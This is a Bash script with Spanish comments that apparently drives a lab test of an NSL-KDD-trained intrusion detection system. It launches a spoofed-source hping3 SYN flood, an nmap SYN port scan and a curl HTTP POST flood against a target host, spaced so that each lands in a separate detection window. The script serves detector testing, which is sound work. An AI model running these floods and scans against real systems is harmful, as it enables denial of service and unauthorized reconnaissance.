#!/bin/bash
# Lanza tres familias de ataque contra la victima, espaciadas en el tiempo.
#
# Cada familia corresponde a un perfil real de NSL-KDD que el modelo aprendio:
#   1. SYN flood   -> perfil `neptune`: SYNs sin respuesta, serror_rate=1.0
#   2. Port scan   -> perfil `nmap`:   muchos puertos, conexiones sin cerrar
#   3. HTTP flood  -> perfil `satan`:  muchas conexiones con carga y respuesta
#
# El espaciado importa: el NIDS clasifica por ventanas de 2 s, asi que los
# ataques tienen que caer en ventanas distintas para verse por separado.

set -u

TARGET="${1:-victim}"
NIDS_WARMUP="${NIDS_WARMUP:-12}"

echo "=============================================="
echo " ATACANTE - objetivo: ${TARGET}"
echo "=============================================="
echo "Esperando ${NIDS_WARMUP}s a que el NIDS empiece a capturar..."
sleep "${NIDS_WARMUP}"

echo ""
echo ">>> [1/3] SYN flood (perfil neptune)"
# --rand-source: origenes falsos, tipico de un DoS. Al no haber respuesta,
# el flujo queda con serror_rate alto y dst_bytes=0.
hping3 -S -p 80 --flood --rand-source -c 400 "${TARGET}" >/dev/null 2>&1
echo "    SYN flood terminado (400 paquetes)"
sleep 6

echo ""
echo ">>> [2/3] Escaneo de puertos (perfil nmap)"
# -sS: escaneo SYN. Muchos puertos destino desde un mismo origen.
nmap -sS -Pn -p 1-300 --max-retries 1 -T4 "${TARGET}" >/dev/null 2>&1
echo "    Escaneo terminado (300 puertos)"
sleep 6

echo ""
echo ">>> [3/3] Inundacion HTTP (perfil satan)"
# Muchas conexiones con carga y respuesta: volumen en ambos sentidos.
for _ in $(seq 1 60); do
    curl -s -m 1 -X POST -d "payload=$(head -c 800 /dev/zero | tr '\0' 'A')" \
        "http://${TARGET}/" >/dev/null 2>&1 &
done
wait
echo "    Flood HTTP terminado (60 peticiones)"
sleep 4

echo ""
echo "=============================================="
echo " Ataques completados. Revisa la salida del NIDS."
echo "=============================================="